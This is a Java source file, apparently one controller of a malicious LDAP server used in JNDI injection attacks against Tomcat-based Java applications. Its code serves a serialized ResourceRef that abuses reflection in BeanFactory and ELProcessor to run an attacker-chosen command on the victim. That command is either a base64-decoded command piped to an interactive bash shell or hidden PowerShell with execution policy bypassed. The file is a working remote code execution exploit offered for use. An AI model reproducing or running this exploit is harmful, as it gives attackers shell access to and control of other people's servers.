@LdapMapping(uri = { "/o=tomcat", "/o=tomcat,pwsh=*", "/o=tomcat,bash=*" })
public class Tomcat implements LdapController {

    public String createPayload (String base) {
        String[] payloadUrl = (base).split(",");
        int urlLenght = payloadUrl.length;
        String base64Command = "";

        if (urlLenght>1){
            if (payloadUrl[1].startsWith("pwsh=")){
                String pwshBase64 = payloadUrl[1].replace("pwsh=","");
                base64Command = "powershell.exe -NonI -W Hidden -NoP -Exec Bypass -Enc " + pwshBase64;
            } else {
                String bashBase64 = payloadUrl[1].replace("bash=","");
                System.out.println("Base64 String:" + bashBase64);
                base64Command = "bash -c {echo," + bashBase64 + "}|{base64,-d}|{bash,-i}";
            }
        } else {
            base64Command = "bash -c {echo," + Base64.getEncoder().encodeToString(Config.command.getBytes()) + "}|{base64,-d}|{bash,-i}";
        }
        return String.format("\"\".getClass().forName(\"javax.script.ScriptEngineManager\").newInstance().getEngineByName(\"JavaScript\").eval(\"java.lang.Runtime.getRuntime().exec('%s')\")", base64Command);
    }

    public void sendResult(InMemoryInterceptedSearchResult result, String base) throws Exception {

        String payload = this.createPayload(base);
        System.out.println("Sending LDAP ResourceRef result for " + base + " with javax.el.ELProcessor payload");
        System.out.println("Sending Payload:" + payload);

        Entry e = new Entry(base);
        e.addAttribute("javaClassName", "java.lang.String"); //could be any

        //prepare payload that exploits unsafe reflection in org.apache.naming.factory.BeanFactory
        ResourceRef ref = new ResourceRef("javax.el.ELProcessor", null, "", "",
                true, "org.apache.naming.factory.BeanFactory", null);
        ref.add(new StringRefAddr("forceString", "x=eval"));
        ref.add(new StringRefAddr("x", payload));
        e.addAttribute("javaSerializedData", serialize(ref));

        result.sendSearchEntry(e);
        result.setResult(new LDAPResult(0, ResultCode.SUCCESS));
    }
}